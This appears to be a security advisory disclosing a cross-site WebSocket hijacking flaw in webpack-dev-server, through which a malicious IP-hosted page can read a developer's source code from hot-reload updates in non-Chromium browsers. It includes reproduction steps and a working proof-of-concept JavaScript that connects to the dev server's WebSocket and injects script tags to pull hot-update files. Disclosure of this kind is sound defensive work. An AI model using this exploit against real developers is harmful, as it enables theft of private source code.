summary: "webpack-dev-server users' source code may be stolen when they access a malicious web\
  \ site with non-Chromium based browser\n### Summary\nSource code may be stolen when you access\
  \ a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header\
  \ is checked to prevent Cross-site WebSocket hijacking from happening which was reported by\
  \ CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\n\
  This allows websites that are served on IP addresses to connect WebSocket.\nBy using the same\
  \ method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages)\
  \ linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\
  \ (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks\
  \ so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other\
  \ Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\
  \n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip)\
  \ and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main`\
  \ with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted\
  \ directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\
  \nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n\
  \    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\
  \t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\n\
  let target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\n\
  let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\n\
  var currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\n\
  ws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n \
  \   if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n\
  \        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n\
  \    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2\
  \ = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n\
  \    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen\
  \ for users that uses a predictable port and uses a non-Chromium based browser."
